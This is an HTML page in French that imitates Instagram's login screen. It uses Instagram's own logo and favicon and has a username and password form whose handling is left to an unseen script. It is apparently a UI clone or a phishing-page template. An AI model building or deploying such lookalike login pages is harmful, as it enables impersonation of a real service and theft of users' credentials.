<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Connexion</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="icon" href="https://instagram.com/favicon.ico">
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <div class="logo">
                <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
            </div>
            <form id="loginForm">
                <input type="text" id="username" name="username" placeholder="Numéro de téléphone, nom d'utilisateur ou e-mail" required>
                <input type="password" id="password" name="password" placeholder="Mot de passe" required>
                <button type="submit">Se connecter</button>
            </form>
            <div class="separator">OU</div>
            <div class="facebook-login">
                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Facebook Logo">
                <span>Se connecter avec Facebook</span>
            </div>
            <div class="forgot-password">
                <a href="#">Mot de passe oublié ?</a>
            </div>
        </div>
        <div class="signup-box">
            <p>Vous n'avez pas de compte ? <a href="#">Inscrivez-vous</a></p>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
